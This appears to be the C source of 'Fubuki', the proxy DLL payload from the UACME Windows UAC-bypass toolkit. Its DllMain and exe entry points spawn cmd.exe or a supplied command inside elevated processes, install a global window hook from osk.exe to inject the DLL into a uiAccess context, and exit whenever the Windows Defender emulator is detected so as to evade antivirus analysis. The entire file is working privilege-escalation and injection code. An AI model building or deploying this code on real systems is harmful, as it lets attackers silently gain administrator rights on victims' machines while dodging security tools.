/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2019
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.19
*
*  DATE:        09 Apr 2019
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"

UACME_PARAM_BLOCK g_SharedParams;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediately.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode;
    PWSTR lpParameter;
    ULONG cbParameter;

    ucmDbgMsg(LoadedMsg);

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");

        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
    }
    else {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
        lpParameter = NULL;
        cbParameter = 0UL;
    }

    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");

    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);

    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");

    //
    // If this is default executable, show runtime info.
    //
    if ((lpParameter == NULL) || (cbParameter == 0)) {
        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_KILO)
            ucmQueryRuntimeInfo(FALSE);
    }

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, completion\r\n");
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    ExitProcess(ExitCode);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - if fInstallHook set - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL,
    _In_ BOOL fInstallHook,
    _In_opt_ LPWSTR lpTargetApp
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
    WCHAR szModuleName[MAX_PATH + 1];

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;
   
    if (fInstallHook) {

        //
        // Check if we are in the required application context
        // Are we inside osk.exe?
        //
        if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
            HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, FUBUKI_WND_HOOKPROC); //UiAccessMethodHookProc
            if (HookProcedure) {
                hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
                if (hHook) {
                    //
                    // Timeout to be enough to spawn target app.
                    //
                    Sleep(15000);
                    UnhookWindowsHookEx(hHook);
                }
            }
            ExitProcess(0);
        }
    }

    //
    // If target application name specified - check are we inside target app?
    //
    if (lpTargetApp) {
        if (_strcmpi(lpFileName, lpTargetApp) == 0) {
            DefaultPayload();
        }
    }
    else {
        //
        // Use any suitable elevated context.
        //
        if (ucmGetProcessElevationType(NULL, &TokenType)) {
            if (TokenType == TokenElevationTypeFull) {
                DefaultPayload();
            }
        }
    }
}


/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        UiAccessMethodPayload(hinstDLL, TRUE, MMC_EXE);
    }

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

/*
* EntryPoint
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPoint(
    VOID)
{
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }
    DefaultPayload();
}


/*
* EntryPointUIAccessLoader
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointUIAccessLoader(
    VOID)
{
    ULONG r;
    WCHAR szParam[MAX_PATH * 2];

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }

    if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
        if (r > 0) {
            ucmUIHackExecute(szParam);
        }
    }
    ExitProcess(0);
}
